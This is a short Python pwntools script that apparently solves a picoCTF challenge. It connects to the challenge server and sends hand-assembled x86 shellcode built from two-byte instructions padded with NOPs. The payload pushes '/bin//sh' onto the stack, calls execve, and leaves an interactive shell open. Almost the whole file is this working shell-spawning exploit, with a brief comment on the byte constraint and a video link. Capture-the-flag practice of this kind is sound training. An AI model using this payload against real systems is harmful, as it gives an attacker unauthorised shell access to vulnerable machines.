from pwn import *
r = remote("mercury.picoctf.net", 40525)

shellcode = "\x31\xC0\x31\xC9\x50\x90\x31\xC0\xB1\x68\x01\xC8\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xB1\x73\x01\xC8\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xB1\x2F\x01\xC8\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xB1\x2F\x01\xC8\x50\x90\x31\xC0\xB1\x6E\x01\xC8\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xB1\x69\x01\xC8\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xB1\x62\x01\xC8\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xD1\xE0\xB1\x2F\x01\xC8\x50\x90\x31\xC0\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80\x31\xC0\x40\x90\xCD\x80"

r.recvuntil("run:")
r.sendline(shellcode)
r.interactive()

# solution hex instruction 2 byte insert 1 NOPS => 1 line instructions hex limited 2 bytes
# https://www.youtube.com/watch?v=_yW5QTVFGl8
